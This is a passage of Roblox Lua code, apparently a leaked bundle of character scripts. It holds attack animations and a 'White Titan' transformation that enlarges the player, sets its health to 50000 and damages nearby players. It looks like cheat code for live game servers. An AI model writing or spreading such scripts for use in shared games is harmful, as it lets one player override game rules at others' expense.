LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5+20*i), 0, math.rad(10)) * CFrame.new(0, 0.7*i, -1*i)
HW.C0 = HWStand * CFrame.Angles(math.rad(-35+10*i), 0, 0) * CFrame.new(0, 0, 1.6-2.6)
neck.C0 = necko * CFrame.Angles(math.rad(-10+50*i), 0, 0)
bg.cframe = CF * CFrame.Angles(math.rad(-180-190*i), 0, 0)
bp.position = cen * CFrame.Angles(math.rad(90-90*i), 0, 0) * CFrame.new(0, 0, -6.5).p
wait()
end
coroutine.resume(coroutine.create(function()
local frr = Cam.CoordinateFrame
for i = 1, math.random(13,20) do
wait()
Cam.CoordinateFrame = frr * CFrame.new(math.random(-15,15)/10, math.random(-15,15)/10, math.random(-15,15)/10)
end
end))
PlaySound(smashsound)
PlaySound(boomboom)
EndEffect()
local poo = Vector3.new(maintip.Position.x, t2.Position.y + t2.Size.y/2, maintip.Position.z)
local siz = math.random(65,115)/10
local partie = Part(workspace, true, false, 1, 0, "White", siz, 0.2, siz, true)
partie.CFrame = CFrame.new(poo) * CFrame.Angles(0, math.rad(math.random(0, 360)), 0)
local decc = Instance.new("Decal",partie)
decc.Shiny = 0
decc.Specular = 0
decc.Texture = "http://www.roblox.com/asset/?id=49173398"
decc.Face = "Top"
local count = 0
for i, v in pairs(workspace:children()) do
local h = getHumanoid(v)
local to = v:findFirstChild("Torso")
if h ~= nil and to ~= nil then
if (to.Position - poo).magnitude < 15 then
count = count + 1
local Maxhp = h.MaxHealth
if Maxhp > 5000 then Maxhp = 5000 end
damage(h, to, 0.5, 0, Maxhp+5)
to.Velocity = CFrame.new(poo, to.Position).lookVector * 30
to.Velocity = to.Velocity + Vector3.new(0, 60, 0)
to.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
h.PlatformStand = true
coroutine.resume(coroutine.create(function() wait(1.2) h.PlatformStand = false end))
if count >= 2 then break end
end
end
end
coroutine.resume(coroutine.create(function() wait(math.random(7,14)) partie:remove() end))
wait(0.6)
for i = 0, 1, 0.06 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150+40*i), math.rad(10-50+40*i), math.rad(40-85+45*i)) * CFrame.new(0, -0.85+0.45+0.4*i, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-130+45*i), 0, math.rad(35-35*i)) * CFrame.new(0, -0.9+0.3+0.6*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(5-80+75*i), 0, math.rad(-10+10*i)) * CFrame.new(0, 0.4-0.4*i, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5+20-15*i), 0, math.rad(10-10*i)) * CFrame.new(0, 0.7-0.7*i, -1+1*i)
HW.C0 = HWStand * CFrame.Angles(math.rad(-35+10+25*i), 0, 0) * CFrame.new(0, 0, 1.6-2.6+1*i)
neck.C0 = necko * CFrame.Angles(math.rad(-10+50-40*i), 0, 0)
bg.cframe = CF * CFrame.Angles(0, 0, 0)
bp.position = cen * CFrame.new(0, 1.2*i, -6.5).p
wait()
end
hum.PlatformStand = false
normal()
bg:remove()
bp:remove()
end
end
function spin(mouse)
attach()
local mouseHit = mouse
local Orig = torso.CFrame
local CF = ComputePos(Orig.p, mouseHit)
local p, t = RayCast(torso.Position, CF * CFrame.new(0, -7, -1.5).p, 5, 0.5)
if t then
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
bp.position = Orig.p
bg.cframe = CF
PlaySound(slash)
for i = 0, 1, 0.11 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(20*i), math.rad(120*i), math.rad(20*i)) * CFrame.new(0, 0, 0)
RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100*i), 0, math.rad(20*i))
LAW.C0 = LAWStand * CFrame.Angles(math.rad(60*i), 0, math.rad(40*i)) * CFrame.new(0, -0.8*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(10*i), 0, 0) * CFrame.new(0, 0.3*i, -0.2*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-25*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0)
neck.C0 = necko * CFrame.Angles(math.rad(-15*i), 0, math.rad(-30*i))
bg.cframe = CF * CFrame.Angles(0, 0, 0)
wait()
end
local posg = CF * CFrame.new(0, -0.6, -4)
PlaySound(hitsound, 0.9)
for i = 0, 1, 0.13 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(20-20*i), math.rad(120+10*i), math.rad(20)) * CFrame.new(0, -0.8*i, 0.4*i)
RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100-60*i), 0, math.rad(20-20*i))
LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-40*i), 0, math.rad(40-50*i)) * CFrame.new(0, -0.8+0.3*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(10-10*i), 0, 0) * CFrame.new(0, 0.3-0.3*i, -0.2+0.2*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-25+25*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35*i)) * CFrame.new(0, 0, -0.6*i)
neck.C0 = necko * CFrame.Angles(math.rad(-15+25*i), 0, math.rad(-30+30*i))
bg.cframe = CF * CFrame.Angles(0, 0, 0)
bp.position = CF * CFrame.new(0, 1*i, -2*i).p
wait()
end
hum.PlatformStand = true
bg.Parent = handle
bg.cframe = CF * CFrame.Angles(math.pi, math.pi, 0)
bp.Parent = handle
bp.position = posg.p
StartEffect(Lleg)
Leghurt = true
PlaySound(slash)
for i = 0, 1, 0.09 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90*i), math.rad(130-40*i), math.rad(20-40*i)) * CFrame.new(0, -0.8+0.8*i, 0.4-0.4*i)
RAW.C1 = CFrame.new(0, 0.5+0.5*i, 0) * CFrame.Angles(math.rad(100-60+60*i), 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-40-20+60*i), 0, math.rad(40-50+10*i)) * CFrame.new(0, -0.8+0.3-0.5*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1*i)
neck.C0 = necko * CFrame.Angles(math.rad(10-35*i), 0, 0)
bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(90*i), 0)
wait()
end
for i = 0, 1, 0.055 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(-20)) * CFrame.new(0, 0, 0)
RAW.C1 = CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(100), 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(60), 0, 0) * CFrame.new(0, -1, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(15+10*i), 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20-5*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1)
neck.C0 = necko * CFrame.Angles(math.rad(-25), 0, 0)
bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(90+270*i), 0)
wait()
end
EndEffect()
Leghurt = false
for i = 0, 1, 0.12 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90+90*i), math.rad(90+40*i), math.rad(-20+40*i)) * CFrame.new(0, -0.8*i, 0.4*i)
RAW.C1 = CFrame.new(0, 1-0.5*i, 0) * CFrame.Angles(math.rad(100-60*i), 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-60*i), 0, 0) * CFrame.new(0, -1+0.5*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(15+10-25*i), 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20-5+25*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1)
neck.C0 = necko * CFrame.Angles(math.rad(-25+25*i), 0, 0)
bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(360), 0)
wait()
end
bg.Parent = torso
bp.Parent = torso
bg.cframe = CF
for i = 0, 1, 0.14 do
RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(90+40-130*i), math.rad(-20+40-20*i)) * CFrame.new(0, -0.8+0.8*i, 0.4-0.4*i)
RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100-60-40*i), 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, -1+0.5+0.5*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35+35*i)) * CFrame.new(0, 0, 1-1*i)
neck.C0 = necko * CFrame.Angles(0, 0, 0)
bp.position = CF * CFrame.new(0, 0, -2+1*i).p
bg.cframe = CF
wait()
end
hum.PlatformStand = false
normal()
bg:remove()
bp:remove()
end
end
function rest()
local Orig = torso.CFrame
local CF = ComputePos(Orig.p, Orig * CFrame.new(0, 0, -5).p)
local p, t = RayCast(CF.p, CF * CFrame.new(0, -6, 0.5).p, 6, 0.5)
if t then
attach()
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
bp.position = CF.p
bg.cframe = CF
local cen = CF * CFrame.new(0, -2.5, 0)
RestingAnim = true
hum.PlatformStand = true
local standup = function()
Resting = false
bp.Parent = torso
cen = ComputePos(torso.CFrame.p, torso.CFrame * CFrame.new(0, 0, -5).p) * CFrame.new(0, 0, -2.5)
for i = 1, 0, -0.12 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(50), math.rad(-20-20*i), math.rad(60*i))
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40-70*i), 0, math.rad(-30-10*i)) * CFrame.new(0, -0.6*i, 0.4+0.2*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(15)) * CFrame.new(0, 0, -0.4)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(-15)) * CFrame.new(0, 0, -0.4)
neck.C0 = necko * CFrame.Angles(math.rad(10-15*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(math.rad(40*i), 0, 0) * CFrame.new(0, 0, 0.2+0.8*i)
bg.cframe = CF * CFrame.Angles(math.rad(-10+20*i), 0, 0)
bp.position = cen * CFrame.Angles(math.rad(180+45+45*i), 0, 0) * CFrame.new(0, -2.5, 0.4*i).p
wait()
end
for i = 1, 0, -0.17 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(50*i), math.rad(-20*i), 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40*i), 0, math.rad(-30*i)) * CFrame.new(0, 0, 0.4*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(15*i)) * CFrame.new(0, -0.4*i, -0.4*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(-15*i)) * CFrame.new(0, -0.4*i, -0.4*i)
neck.C0 = necko * CFrame.Angles(math.rad(10*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0.2*i)
bg.cframe = CF * CFrame.Angles(math.rad(-10*i), 0, 0)
bp.position = cen * CFrame.Angles(math.rad(180+45*i), 0, 0) * CFrame.new(0, -2.5, 0).p
wait()
end
hum.PlatformStand = false
bg:remove()
bp:remove()
normal()
Able = true
RestingAnim = false
end
local connec = hum.Changed:connect(function()
if hum.PlatformStand == false then
coroutine.resume(coroutine.create(function()
standup()
end))
standup = nil
connec:disconnect()
end
end)
local lasthp = hum.Health
local conn = hum.HealthChanged:connect(function(hp)
if lasthp - hp > 0.8 then
hum.PlatformStand = false
conn:disconnect()
end
lasthp = hp
end)
coroutine.resume(coroutine.create(function()
repeat wait() until Resting
while Resting do
wait()
if torso.Velocity.magnitude > 4 then
hum.PlatformStand = false
break
end
end
end))
for i = 0, 1, 0.1 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(50*i), math.rad(-20*i), 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40*i), 0, math.rad(-30*i)) * CFrame.new(0, 0, 0.4*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(15*i)) * CFrame.new(0, 0, -0.4*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(-15*i)) * CFrame.new(0, 0, -0.4*i)
neck.C0 = necko * CFrame.Angles(math.rad(10*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0.2*i)
bg.cframe = CF * CFrame.Angles(math.rad(-10*i), 0, 0)
bp.position = cen * CFrame.Angles(math.rad(180+45*i), 0, 0) * CFrame.new(0, -2.5, 0).p
wait()
end
for i = 0, 1, 0.07 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(50), math.rad(-20-20*i), math.rad(60*i))
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40-70*i), 0, math.rad(-30-10*i)) * CFrame.new(0, -0.6*i, 0.4+0.2*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(15)) * CFrame.new(0, -0.4*i, -0.4)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(-15)) * CFrame.new(0, -0.4*i, -0.4)
neck.C0 = necko * CFrame.Angles(math.rad(10-15*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(math.rad(40*i), 0, 0) * CFrame.new(0, 0, 0.2+0.8*i)
bg.cframe = CF * CFrame.Angles(math.rad(-10+20*i), 0, 0)
bp.position = cen * CFrame.Angles(math.rad(180+45+45*i), 0, 0) * CFrame.new(0, -2.5, 0.4*i).p
wait()
end
Resting = true
coroutine.resume(coroutine.create(function()
wait(0.4)
bp.Parent = nil
end))
coroutine.resume(coroutine.create(function()
while Resting and selected do
wait(math.random(350,800)/1000)
hum.Health = hum.Health + math.random(1,2)
Prop.Rage = Prop.Rage + 1
end
hum.PlatformStand = false
end))
end
end
function select(mouse)
mouse.Icon = MouseIc
selectanim()
selected = true
mouse.Button1Down:connect(function()
if Able and RestingAnim == false and hum.Sit == false then
Able = false
swing(mouse.Hit.p)
Able = true
end
end)
mouse.Button1Down:connect(function()
mouse.Icon = MouseDo
mouse.Button1Up:wait()
mouse.Icon = MouseIc
end)
mouse.KeyDown:connect(function(key)
key = key:lower()
if Able and RestingAnim == false and hum.Sit == false then
if key == "q" then
Able = false
smash(mouse.Hit.p)
Able = true
elseif key == "e" then
Able = false
swing(mouse.Hit.p)
Able = true
elseif key == "r" then
Able = false
stab(mouse.Hit.p)
Able = true
elseif key == "f" then
Able = false
epicsmash(mouse.Hit.p)
Able = true
elseif key == "z" then
Able = false
shockwave(mouse.Hit.p)
Able = true
elseif key == "x" then
Able = false
flipsmash(mouse.Hit.p)
Able = true
elseif key == "t" then
Able = false
spin(mouse.Hit.p)
Able = true
end
end
if Able then
if key == "g" and AbleG then
AbleG = false
if Resting == true then
Resting = false
else
rest()
end
wait(0.8)
AbleG = true
end
end
end)
end
function deselect(mouse)
selected = false
deselanim()
end
bin.Selected:connect(select)
bin.Deselected:connect(deselect)

end}

 
 

module[1] = {"White Titan",function()
--leaked by LeakingProScripts
local p = game.Players.LocalPlayer
local char = p.Character
local mouse = p:GetMouse()
local larm = char["Left Arm"]
local rarm = char["Right Arm"]
local lleg = char["Left Leg"]
local rleg = char["Right Leg"]
local hed = char.Head
local torso = char.Torso
local hum = char.Humanoid
local cam = game.Workspace.CurrentCamera
local root = char.HumanoidRootPart
local deb = false
local shot = 0
local l = game:GetService("Lighting")
local rs = game:GetService("RunService").RenderStepped
local stanceToggle = "Normal"
math.randomseed(os.time())
hum.WalkSpeed = 7
if char:FindFirstChild('Health') then
char:FindFirstChild('Health'):Destroy()
end
hum.MaxHealth = 50000
wait(0.1)
hum.Health = 50000
----------------------------------------------------
pcall(function()char.Shirt:Destroy()
char.Pants:Destroy()
end)
shirt = Instance.new("Shirt", char)
shirt.Name = "Shirt"
pants = Instance.new("Pants", char)
pants.Name = "Pants"
char.Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=268303759"
char.Pants.PantsTemplate = "http://www.roblox.com/asset/?id=268303786"
----------------------------------------------------
Debounces = {
on = false;
ks = false;
CanAttack = true;
CanJoke = true;
NoIdl = false;
Slashing = false;
Slashed = false;
Grabbing = false;
Grabbed = false;
}
local Touche = {char.Name, }
----------------------------------------------------
function lerp(a, b, t) -- Linear interpolation
    return a + (b - a)*t
end
 
function slerp(a, b, t) --Spherical interpolation
    dot = a:Dot(b)
    if dot > 0.99999 or dot < -0.99999 then
        return t <= 0.5 and a or b
    else
        r = math.acos(dot)
        return (a*math.sin((1 - t)*r) + b*math.sin(t*r)) / math.sin(r)
    end
end
 
function matrixInterpolate(a, b, t)
    local ax, ay, az, a00, a01, a02, a10, a11, a12, a20, a21, a22 = a:components()
    local bx, by, bz, b00, b01, b02, b10, b11, b12, b20, b21, b22 = b:components()
    local v0 = lerp(Vector3.new(ax, ay, az), Vector3.new(bx , by , bz), t) -- Position
    local v1 = slerp(Vector3.new(a00, a01, a02), Vector3.new(b00, b01, b02), t) -- Vector  right
    local v2 = slerp(Vector3.new(a10, a11, a12), Vector3.new(b10, b11, b12), t) -- Vector  up
    local v3 = slerp(Vector3.new(a20, a21, a22), Vector3.new(b20, b21, b22), t) -- Vector  back
    local t = v1:Dot(v2)
    if not (t < 0 or t == 0 or t > 0) then     -- Failsafe
        return CFrame.new()
    end
    return CFrame.new(
    v0.x, v0.y, v0.z,
    v1.x, v1.y, v1.z,
    v2.x, v2.y, v2.z,
    v3.x, v3.y, v3.z)
end
----------------------------------------------------
function genWeld(a,b)
    local w = Instance.new("Weld",a)
    w.Part0 = a
    w.Part1 = b
    return w
end
function weld(a, b)
    local weld = Instance.new("Weld")
    weld.Name = "W"
    weld.Part0 = a
    weld.Part1 = b
    weld.C0 = a.CFrame:inverse() * b.CFrame
    weld.Parent = a
    return weld;
end
----------------------------------------------------
function Lerp(c1,c2,al)
local com1 = {c1.X,c1.Y,c1.Z,c1:toEulerAnglesXYZ()}
local com2 = {c2.X,c2.Y,c2.Z,c2:toEulerAnglesXYZ()}
for i,v in pairs(com1) do 
com1[i] = v+(com2[i]-v)*al
end
return CFrame.new(com1[1],com1[2],com1[3]) * CFrame.Angles(select(4,unpack(com1)))
end
----------------------------------------------------
newWeld = function(wp0, wp1, wc0x, wc0y, wc0z)
local wld = Instance.new("Weld", wp1)
wld.Part0 = wp0
wld.Part1 = wp1
wld.C0 = CFrame.new(wc0x, wc0y, wc0z)
end
----------------------------------------------------
for i,v in pairs(char:children()) do
    if v:IsA("Hat") then
        v:Destroy()
    end
end
for i,v in pairs(hed:children()) do
    if v:IsA("Sound") then
        v:Destroy()
    end
end
----------------------------------------------------
function HasntTouched(plrname)
local ret = true
for _, v in pairs(Touche) do
if v == plrname then
ret = false
end
end
return ret
end
----------------------------------------------------
larm.Size = larm.Size * 2
rarm.Size = rarm.Size * 2
lleg.Size = lleg.Size * 2
rleg.Size = rleg.Size * 2
torso.Size = torso.Size * 2
hed.Size = hed.Size * 2
root.Size = root.Size * 2
----------------------------------------------------
newWeld(torso, larm, -1.5, 0.5, 0)
larm.Weld.C1 = CFrame.new(0, 0.5, 0)
newWeld(torso, rarm, 1.5, 0.5, 0)
rarm.Weld.C1 = CFrame.new(0, 0.5, 0)
newWeld(torso, hed, 0, 1.5, 0)
newWeld(torso, lleg, -0.5, -1, 0)
lleg.Weld.C1 = CFrame.new(0, 1, 0)
newWeld(torso, rleg, 0.5, -1, 0)
rleg.Weld.C1 = CFrame.new(0, 1, 0)
newWeld(root, torso, 0, -1, 0)
torso.Weld.C1 = CFrame.new(0, -1, 0)
----------------------------------------------------
game:GetService('InsertService'):LoadAsset(250405532):children()[1].Parent=char
char.GildedWings.Handle.Mesh.Scale = char.GildedWings.Handle.Mesh.Scale * 1.8
char.GildedWings.Handle.Mesh.VertexColor = Vector3.new(1,1,1)
hed.face.Texture = "rbxassetid://127498555"
z=Instance.new('Decal',hed)
z.Face = 'Front'
z.Texture='rbxassetid://36527089'
hed.BrickColor = BrickColor.new("Institutional white")
lite = Instance.new("PointLight", torso)
lite.Brightness = 14
lite.Range = 10
lite.Color = Color3.new(1, 0, 0)
--[[local hed2 = hed:Clone()
hed2.CanCollide = false
hed2.Parent = char
hed2:ClearAllChildren()
hed2.Transparency = 1
hed2.Name = "DARP"
local w = Instance.new("Weld",hed2)
w.Part0 = hed
w.Part1 = hed2
w.C0 = CFrame.new(0,0,-0.175)
z=Instance.new("SurfaceGui",hed2)
z.Enabled = true
z.Face = "Front"
z.Adornee = hed2
z.CanvasSize = Vector2.new(100,100)
local face = Instance.new("ImageLabel",z)
face.Size = UDim2.new(1,-30,1,0)
face.Position = UDim2.new(0,15,0,0)
face.BackgroundTransparency = 1
face.Image='rbxassetid://46282671']]--
----------------------------------------------------
game:service'InsertService':LoadAsset(134822899):children()[1].Parent=char
char.LightStudent.Handle.Mesh.Scale = char.LightStudent.Handle.Mesh.Scale * 1.8
char.LightStudent.Handle.Mesh.VertexColor = Vector3.new(1,1,1)
----------------------------------------------------

z = Instance.new("Sound", char)
z.SoundId = "rbxassetid://190470714 "--242463565
z.Looped = true
z.Pitch = 1
z.Volume = 1
wait(.01)
z:Play()
----------------------------------------------------
local m = Instance.new("Model")
m.Name = "Absolution"
p1 = Instance.new("Part", m)
p1.BrickColor = BrickColor.new("New Yeller")
p1.FormFactor = Enum.FormFactor.Custom
p1.Size = Vector3.new(1, 0.600000024, 1.5)
p1.CFrame = CFrame.new(67.4994888, 12.1560526, 73.0205841, 0.999972522, -3.59117985e-005, -8.00192356e-006, -1.39250187e-005, 0.358383715, -0.933530986, 5.28097153e-005, 0.933500648, 0.358406395)
p1.CanCollide = false
p1.Locked = true
p1.Elasticity = 0
p1.BottomSurface = Enum.SurfaceType.Smooth
p1.TopSurface = Enum.SurfaceType.Smooth
b1 = Instance.new("SpecialMesh", p1)
b1.MeshType = Enum.MeshType.Wedge
b1.Name = "Mesh"
b1.Scale = Vector3.new(0.400000006, 0.600000024, 0.699999928)
p2 = Instance.new("Part", m)
p2.BrickColor = BrickColor.new("Institutional white")
p2.FormFactor = Enum.FormFactor.Custom
p2.Size = Vector3.new(1, 2.9000001, 1)
p2.CFrame = CFrame.new(67.4995728, 11.7633543, 74.2129135, -1.30959779e-005, 2.79811252e-006, 0.999972522, 0.961226642, 0.275612593, -7.50799518e-006, -0.275637805, 0.96119839, 1.01176247e-005)
p2.CanCollide = false
p2.Locked = true
p2.Elasticity = 0
p2.BottomSurface = Enum.SurfaceType.Smooth
p2.TopSurface = Enum.SurfaceType.Smooth
b2 = Instance.new("BlockMesh", p2)
b2.Name = "Mesh"
b2.Scale = Vector3.new(0.400000006, 1, 0.400000006)
p3 = Instance.new("Part", m)
p3.BrickColor = BrickColor.new("New Yeller")
p3.FormFactor = Enum.FormFactor.Custom
p3.Size = Vector3.new(1, 1.20000005, 2.0999999)
p3.CFrame = CFrame.new(67.4994965, 12.6401453, 73.9670334, 0.999972522, -3.52207899e-005, -8.10639358e-006, -1.61500211e-005, 0.309035271, -0.951007903, 5.24176576e-005, 0.950978875, 0.309059501)
p3.CanCollide = false
p3.Locked = true
p3.Elasticity = 0
p3.BottomSurface = Enum.SurfaceType.Smooth
p3.TopSurface = Enum.SurfaceType.Smooth
b3 = Instance.new("SpecialMesh", p3)
b3.MeshType = Enum.MeshType.Wedge
b3.Name = "Mesh"
b3.Scale = Vector3.new(0.400000006, 0.600000024, 0.699999928)
p4 = Instance.new("Part", m)
p4.BrickColor = BrickColor.new("New Yeller")
p4.FormFactor = Enum.FormFactor.Custom
p4.Size = Vector3.new(1, 1.43999994, 2.05000019)
p4.CFrame = CFrame.new(67.4995575, 11.8683414, 76.1565704, 0.999972522, -2.5085672e-005, -1.53700166e-005, -4.86194367e-005, -0.800831437, -0.598821938, 1.9131101e-005, 0.598835468, -0.800796151)
p4.CanCollide = false
p4.Locked = true
p4.Elasticity = 0
p4.BottomSurface = Enum.SurfaceType.Smooth
p4.TopSurface = Enum.SurfaceType.Smooth
b4 = Instance.new("SpecialMesh", p4)
b4.MeshType = Enum.MeshType.Wedge
b4.Name = "Mesh"
b4.Scale = Vector3.new(0.300000012, 0.600000024, 0.699999988)
p5 = Instance.new("Part", m)
p5.BrickColor = BrickColor.new("New Yeller")
p5.FormFactor = Enum.FormFactor.Custom
p5.Size = Vector3.new(1, 1.20000005, 3.20000005)
p5.CFrame = CFrame.new(67.4995193, 13.241991, 74.8357468, 0.999972522, -3.59118021e-005, -8.00191992e-006, -1.39250224e-005, 0.358383656, -0.933530807, 5.2809708e-005, 0.933500469, 0.358406246)
p5.CanCollide = false
p5.Locked = true
p5.Elasticity = 0
p5.BottomSurface = Enum.SurfaceType.Smooth
p5.TopSurface = Enum.SurfaceType.Smooth
b5 = Instance.new("SpecialMesh", p5)
b5.MeshType = Enum.MeshType.Wedge
b5.Name = "Mesh"
b5.Scale = Vector3.new(0.400000006, 0.600000024, 0.699999928)
p6 = Instance.new("Part", m)
p6.Name = "Handle"
p6.BrickColor = BrickColor.new("Institutional white")
p6.FormFactor = Enum.FormFactor.Custom
p6.Size = Vector3.new(1.5999999, 13.6000004, 1)
p6.CFrame = CFrame.new(67.5017471, 11.2780685, 66.1421967, -1.18190947e-005, 6.28741009e-006, 0.999972522, 0.99995929, -1.39772892e-005, -7.50630716e-006, -1.79708004e-005, 0.999939024, 1.01296728e-005)
p6.CanCollide = false
p6.Locked = true
p6.Elasticity = 0
p6.BottomSurface = Enum.SurfaceType.Smooth
p6.TopSurface = Enum.SurfaceType.Smooth
b6 = Instance.new("BlockMesh", p6)
b6.Name = "Mesh"
b6.Scale = Vector3.new(0.400000006, 1, 0.400000006)
p7 = Instance.new("Part", m)
p7.BrickColor = BrickColor.new("New Yeller")
p7.FormFactor = Enum.FormFactor.Custom
p7.Size = Vector3.new(1, 1.00999999, 1.05000019)
p7.CFrame = CFrame.new(67.5174179, 10.5228004, 76.3114471, 0.999972522, -2.76626724e-005, -6.72184569e-006, -4.7347472e-005, -0.91489929, -0.403581172, 2.14323372e-005, 0.403602213, -0.914867818)
p7.CanCollide = false
p7.Locked = true
p7.Elasticity = 0
p7.BottomSurface = Enum.SurfaceType.Smooth
p7.TopSurface = Enum.SurfaceType.Smooth
b7 = Instance.new("SpecialMesh", p7)
b7.MeshType = Enum.MeshType.Wedge
b7.Name = "Mesh"
b7.Scale = Vector3.new(0.300000012, 0.600000024, 0.699999988)
p8 = Instance.new("Part", m)
p8.BrickColor = BrickColor.new("New Yeller")
p8.FormFactor = Enum.FormFactor.Custom
p8.Size = Vector3.new(1, 1.00999999, 1.05000019)
p8.CFrame = CFrame.new(67.5074387, 8.51285458, 76.8714371, 0.999972522, -2.76626724e-005, -6.72184387e-006, -4.73474684e-005, -0.91489917, -0.403581113, 2.14323354e-005, 0.403602153, -0.914867699)
p8.CanCollide = false
p8.Locked = true
p8.Elasticity = 0
p8.BottomSurface = Enum.SurfaceType.Smooth
p8.TopSurface = Enum.SurfaceType.Smooth
b8 = Instance.new("SpecialMesh", p8)
b8.MeshType = Enum.MeshType.Wedge
b8.Name = "Mesh"
b8.Scale = Vector3.new(0.300000012, 0.600000024, 0.699999988)
p9 = Instance.new("Part", m)
p9.BrickColor = BrickColor.new("Institutional white")
p9.FormFactor = Enum.FormFactor.Custom
p9.Size = Vector3.new(1, 1.07999957, 1)
p9.CFrame = CFrame.new(67.5095749, 7.1092, 74.5051422, -2.60536999e-005, -5.21559741e-006, 0.999972522, 0.35323599, -0.935490847, -1.50012565e-005, 0.935460567, 0.353258699, 4.2632455e-005)
p9.CanCollide = false
p9.Locked = true
p9.Elasticity = 0
p9.BottomSurface = Enum.SurfaceType.Smooth
p9.TopSurface = Enum.SurfaceType.Smooth
b9 = Instance.new("BlockMesh", p9)
b9.Name = "Mesh"
b9.Scale = Vector3.new(0.550000012, 1, 0.550000012)
p10 = Instance.new("Part", m)
p10.BrickColor = BrickColor.new("Institutional white")
p10.FormFactor = Enum.FormFactor.Custom
p10.Size = Vector3.new(1, 1.41999948, 1)
p10.CFrame = CFrame.new(67.489624, 8.67401791, 72.7929764, -9.47785156e-006, -9.42233055e-006, 0.999972522, 0.292371064, 0.956263304, -7.54374832e-006, -0.956253231, 0.292334616, 1.01081387e-005)
p10.CanCollide = false
p10.Locked = true
p10.Elasticity = 0
p10.BottomSurface = Enum.SurfaceType.Smooth
p10.TopSurface = Enum.SurfaceType.Smooth
b10 = Instance.new("BlockMesh", p10)
b10.Name = "Mesh"
b10.Scale = Vector3.new(0.400000006, 1, 0.400000006)
p11 = Instance.new("Part", m)
p11.BrickColor = BrickColor.new("Institutional white")
p11.FormFactor = Enum.FormFactor.Custom
p11.Size = Vector3.new(1, 1.50999951, 1)
p11.CFrame = CFrame.new(67.509552, 7.11887455, 70.3475952, -1.87569385e-005, 1.80455972e-005, 0.999972522, -0.36222899, -0.932047009, -9.30004444e-006, 0.932039678, -0.362191886, 4.04359016e-005)
p11.CanCollide = false
p11.Locked = true
p11.Elasticity = 0
p11.BottomSurface = Enum.SurfaceType.Smooth
p11.TopSurface = Enum.SurfaceType.Smooth
b11 = Instance.new("BlockMesh", p11)
